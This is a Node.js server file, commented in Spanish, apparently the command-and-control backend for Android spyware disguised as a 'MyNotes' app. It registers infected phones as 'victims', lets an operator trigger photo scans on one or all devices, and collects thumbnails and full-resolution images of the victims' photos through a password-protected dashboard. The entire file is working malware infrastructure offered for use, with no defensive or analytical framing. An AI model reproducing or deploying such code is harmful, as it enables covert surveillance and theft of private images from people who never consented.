const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

// --- 1. SEGURIDAD ---
const AUTH_PASS = "admin123"; // Tu contraseña

app.get('/', (req, res) => {
    if (req.query.auth !== AUTH_PASS) {
        return res.send(`<body style="background:#121212; color:white; display:flex; justify-content:center; align-items:center; height:100vh;"><h2>🔒 ACCESO DENEGADO</h2></body>`);
    }

    res.send(`
    <html>
        <head>
            <title>MyNotes C&C</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; margin: 0; padding: 20px; }
                
                /* DASHBOARD ESTILO PANEL DE CONTROL */
                .dashboard {
                    position: sticky; top: 0; z-index: 100;
                    background: #1e1e1e; padding: 15px; border-radius: 10px;
                    border: 1px solid #333; box-shadow: 0 5px 15px rgba(0,0,0,0.8);
                    margin-bottom: 20px;
                }

                .status-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
                h3 { margin: 0; color: #bbb; font-size: 14px; text-transform: uppercase; }

                /* SELECTORES */
                .selectors { display: grid; grid-template-columns: 2fr 1fr; gap: 10px; margin-bottom: 10px; }
                
                select {
                    padding: 12px; background: #2c2c2c; color: white; border: 1px solid #444; 
                    border-radius: 5px; font-weight: bold; width: 100%; outline: none;
                }
                select:focus { border-color: #2979ff; }

                /* BOTONES DE COMANDO */
                .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
                
                button { 
                    padding: 12px; border: none; border-radius: 5px; font-weight: bold; 
                    cursor: pointer; color: white; transition: 0.2s; font-size: 13px;
                }
                
                .btn-start { background: #2979ff; } 
                .btn-start:hover { background: #1565c0; }
                
                .btn-stop { background: #d50000; } 
                .btn-stop:hover { background: #b71c1c; }

                /* GRILLA DE FOTOS */
                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 8px; }
                
                .card { background: #000; border-radius: 5px; overflow: hidden; position: relative; border: 1px solid #333; }
                .card img { width: 100%; height: 100px; object-fit: cover; }
                .card.hd img { border-bottom: 3px solid #00e676; height: 120px; }
                
                .badge {
                    position: absolute; top: 0; right: 0; background: rgba(0,0,0,0.8); 
                    color: #fff; padding: 3px 6px; font-size: 9px; border-bottom-left-radius: 5px;
                }
            </style>
        </head>
        <body>
            <div class="dashboard">
                <div class="status-row">
                    <span>📡 ESTADO: <span id="status" style="color:#ff1744">Desconectado</span></span>
                    <span id="counter" style="color:#00e676">0 fotos</span>
                </div>

                <div class="selectors">
                    <div>
                        <h3>🎯 OBJETIVO (VÍCTIMA)</h3>
                        <select id="victimSelector">
                            <option value="ALL">📢 TODOS LOS DISPOSITIVOS</option>
                        </select>
                    </div>
                    
                    <div>
                        <h3>📂 FILTRAR CARPETA</h3>
                        <select id="folderFilter" onchange="applyFilter()">
                            <option value="ALL">Todas</option>
                        </select>
                    </div>
                </div>
                
                <div class="controls">
                    <button class="btn-start" onclick="sendCommand('start')">▶ INICIAR ESCANEO</button>
                    <button class="btn-stop" onclick="sendCommand('stop')">⏹ DETENER ESCANEO</button>
                </div>
            </div>

            <div class="grid" id="grid"></div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                const grid = document.getElementById('grid');
                const victimSelector = document.getElementById('victimSelector');
                const folderFilter = document.getElementById('folderFilter');
                const counter = document.getElementById('counter');
                
                let photoCount = 0;
                let knownFolders = new Set();

                // --- GESTIÓN DE VÍCTIMAS ---
                socket.on('update_device_list', (devices) => {
                    const currentSelection = victimSelector.value;
                    victimSelector.innerHTML = '<option value="ALL">📢 TODOS LOS DISPOSITIVOS (' + Object.keys(devices).length + ')</option>';
                    
                    for (const [socketId, info] of Object.entries(devices)) {
                        const option = document.createElement('option');
                        option.value = socketId;
                        option.innerText = "📱 " + info.name + " (" + info.id.substring(0,6) + "...)";
                        victimSelector.appendChild(option);
                    }
                    victimSelector.value = currentSelection; // Mantener selección si posible
                });

                // --- ENVIAR COMANDOS ---
                function sendCommand(action) {
                    const targetId = victimSelector.value;
                    const cmd = action === 'start' ? 'start_scan' : 'stop_scan';
                    
                    // Enviamos el comando indicando el objetivo
                    socket.emit('admin_command', { action: cmd, target: targetId });
                    
                    // Limpiamos grilla si iniciamos nuevo escaneo para no mezclar
                    if(action === 'start') {
                        // grid.innerHTML = ''; // Opcional: Limpiar si quieres ver solo lo nuevo
                        // photoCount = 0;
                    }
                }

                // --- RECIBIR DATOS ---
                socket.on('new_preview', data => {
                    // Actualizar filtro de carpetas
                    if (!knownFolders.has(data.folder)) {
                        knownFolders.add(data.folder);
                        const opt = document.createElement('option');
                        opt.value = data.folder;
                        opt.innerText = data.folder;
                        folderFilter.appendChild(opt);
                    }
                    renderCard(data);
                });

                socket.on('receive_full', data => {
                    downloadBase64File(data.image64, data.name);
                    // Marcar visualmente como descargado
                    const card = document.getElementById(data.path);
                    if(card) {
                        card.classList.add('hd');
                        card.querySelector('button').innerText = "✅ DESCARGADO";
                        card.querySelector('button').style.background = "#00c853";
                    }
                });

                function renderCard(data) {
                    if(document.getElementById(data.path)) return;
                    photoCount++;
                    counter.innerText = photoCount + " fotos";

                    const div = document.createElement('div');
                    div.className = 'card';
                    div.id = data.path;
                    div.setAttribute('data-folder', data.folder);
                    div.innerHTML = \`
                        <span class="badge">\${data.folder}</span>
                        <img src="data:image/jpeg;base64,\${data.image64}">
                        <button style="width:100%; padding:5px; background:#6200ea; border:none; color:white; font-weight:bold; cursor:pointer;" onclick="pedirHD('\${data.path}')">⚡ HD</button>
                    \`;
                    
                    if (folderFilter.value !== "ALL" && folderFilter.value !== data.folder) {
                        div.style.display = "none";
                    }
                    grid.prepend(div);
                }

                function applyFilter() {
                    const sel = folderFilter.value;
                    const cards = document.getElementsByClassName('card');
                    for(let c of cards) {
                        c.style.display = (sel === "ALL" || c.getAttribute('data-folder') === sel) ? "block" : "none";
                    }
                }

                function pedirHD(path) { 
                    // Para pedir HD, necesitamos saber a quién pedirle. 
                    // Por simplicidad, este broadcast lo reciben todos, pero solo el que tiene la ruta responde.
                    socket.emit('order_download', { path: path }); 
                }

                function downloadBase64File(base64Data, fileName) {
                    const link = document.createElement('a');
                    link.href = "data:image/jpeg;base64," + base64Data;
                    link.download = fileName;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
                
                socket.on('connection_alert', msg => {
                    document.getElementById('status').innerText = msg;
                    document.getElementById('status').style.color = msg.includes("Admin") ? "#00e676" : "#ff1744";
                });
            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, allowEIO3: true, maxHttpBufferSize: 1e8 });

// ALMACÉN DE VÍCTIMAS { socketId: { name: "Samsung...", id: "android_id..." } }
let victims = {};

io.on('connection', (socket) => {
    
    // Identificar conexión (no sabemos si es Admin o Víctima aún)
    
    socket.on('usrData', (data) => {
        // --- 1. REGISTRO DE DISPOSITIVO ---
        if (data.dataType === 'register_device') {
            victims[socket.id] = { name: data.deviceName, id: data.deviceId };
            console.log(`📱 Nueva Víctima: ${data.deviceName} (${socket.id})`);
            
            // Avisar a todos los admins conectados que hay nueva víctima
            io.emit('update_device_list', victims);
        }
        // --- 2. PREVIEW DE IMAGEN ---
        else if (data.dataType === 'preview_image') {
            io.emit('new_preview', data); // Reenviar al dashboard
        }
        // --- 3. IMAGEN FULL HD ---
        else if (data.dataType === 'full_image') {
            io.emit('receive_full', data); // Reenviar al dashboard
        }
    });

    // --- COMANDOS DEL ADMIN ---
    socket.on('admin_command', (cmd) => {
        // cmd = { action: 'start_scan', target: 'socket_id_victima' OR 'ALL' }
        
        if (cmd.target === 'ALL') {
            socket.broadcast.emit('command_' + cmd.action); // A todos
        } else if (victims[cmd.target]) {
            // Enviar SOLO a la víctima seleccionada
            io.to(cmd.target).emit('command_' + cmd.action);
        }
    });

    socket.on('order_download', (data) => socket.broadcast.emit('request_full_image', data));

    // --- DESCONEXIÓN ---
    socket.on('disconnect', () => {
        if (victims[socket.id]) {
            console.log(`❌ Víctima desconectada: ${victims[socket.id].name}`);
            delete victims[socket.id];
            io.emit('update_device_list', victims); // Actualizar lista en dashboard
        }
    });
    
    // Al conectar un admin, le enviamos la lista actual
    socket.emit('update_device_list', victims);
    socket.emit('connection_alert', '✅ Panel Admin Conectado');
});

server.listen(process.env.PORT || 3000, () => console.log('Servidor C&C Listo'));
